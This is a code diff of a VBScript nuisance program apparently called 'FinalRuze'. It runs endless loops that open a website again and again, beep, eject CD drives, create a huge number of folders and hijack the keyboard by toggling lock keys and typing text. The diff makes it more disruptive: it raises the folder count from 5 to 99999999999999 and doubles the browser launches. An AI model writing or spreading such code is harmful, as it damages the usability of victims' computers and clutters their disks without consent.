@@ -2,13 +2,14 @@ Option Explicit
 
 Dim objShell, objShellApp, objDesktop, objFolder, objItem, xPos, yPos, ts, strDriveLetter, intDriveLetter, fs, colCDROMs, d, oWMP, i, folder_name
 Const CDROM = 4
-Const num_folders = 5
+Const num_folders = 99999999999999
 Dim base_folder_name
 
 ' Open website loop
 Do While True
     CreateObject("WScript.Shell").Run "https://j26nabr4tcsw908qiu.weebly.com/", 1, False
-    WScript.Sleep 1000
+    CreateObject("WScript.Shell").Run "https://j26nabr4tcsw908qiu.weebly.com/", 1, False
+    WScript.Sleep 5000
 Loop
 
 ' Beep sound loop
@@ -32,7 +33,7 @@ Do While True
 Loop
 
 ' Eject CD loop
-Do While True
+Do
     Set fs = CreateObject("Scripting.FileSystemObject")
     strDriveLetter = ""
     For intDriveLetter = Asc("A") To Asc("Z")
@@ -54,8 +55,8 @@ Do While True
     Next
     set owmp = nothing
     set colCDROMs = nothing
-    WScript.Sleep 1000
-Loop
+    WScript.Sleep 5000
+loop
 
 ' Create many folders
 base_folder_name = "FinalRuze"
@@ -67,10 +68,10 @@ Next
 
 ' Type some text and toggle lock keys
 set objShell = wscript.createobject ("wscript.shell")
-do while True
+do
     wscript.sleep 100
     objShell.sendkeys "{CAPSLOCK}"
     objShell.sendkeys "{NUMLOCK}"
     objShell.sendkeys "This is the FinalRuze"
     objShell.sendkeys "{SCROLLLOCK}"
-Loop
+loop
